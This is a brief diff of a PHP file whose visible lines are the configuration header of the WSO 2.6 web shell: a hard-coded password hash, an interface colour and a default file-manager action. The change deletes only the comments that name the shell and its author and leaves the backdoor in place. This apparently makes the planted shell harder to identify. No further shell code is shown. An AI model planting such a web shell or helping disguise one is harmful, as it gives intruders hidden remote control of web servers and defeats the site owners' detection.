@@ -1,6 +1,4 @@
 <?php 
-/* WSO 2.6 (404 Error Web Shell by Madleets.com) */
-/*Maded by DrSpy*/
 $auth_pass = "5a9d8ada6a6da97ec915e0873071694a"; 
 $color = "#00ff00"; 
 $default_action = 'FilesMan'; 
